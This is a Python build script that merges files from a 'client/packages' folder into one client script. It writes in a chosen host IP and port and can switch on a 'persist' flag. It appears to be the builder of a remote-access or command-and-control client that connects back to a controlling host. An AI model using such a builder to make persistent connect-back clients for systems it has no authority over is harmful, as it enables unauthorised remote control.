import os

def generate(hostIP='localhost',hostPORT=1024,name="client",peristence=False):
    try:
        os.chdir('client/packages')
        files = [file for file in os.listdir('.') if os.path.isfile(file) and file != 'build.py' and file != 'main.py' and '.py' in file]
        files.append('main.py')
        source = ''
        packages = set()
        for f in files:
            with open(f, 'r') as file:
                # Read the contents of the file
                content = ''
                for line in file.read().split('\n'):
                    if line.replace(" ", "").startswith('#'):
                        pass
                    elif line.startswith('import '):
                        if line not in packages:
                            packages.add(line)
                    elif "a = 'HOST_IP'" in line:
                        line = line.replace("a = 'HOST_IP'", "a = '{}'".format(hostIP))
                        content += line + '\n'
                    elif "b = 9999" in line:
                        line = line.replace("b = 9999", "b = {}".format(hostPORT))
                        content += line + '\n'
                    elif "persist = False" in line and peristence == True:
                        line = line.replace("persist = False", "persist = True")
                        content += line + '\n'
                    else:
                        content += line + '\n'
                source = source + content

        source = '\n'.join(sorted(list(packages))) + '\n' + source
        buildPath = '../build'
        try:
            os.mkdir(buildPath)
        except FileExistsError:
            pass
        os.chdir(buildPath)
        with open(name+'.py', 'w') as file:
            file.write(source)
        os.chdir('../..')
        return True
    except:
        return False
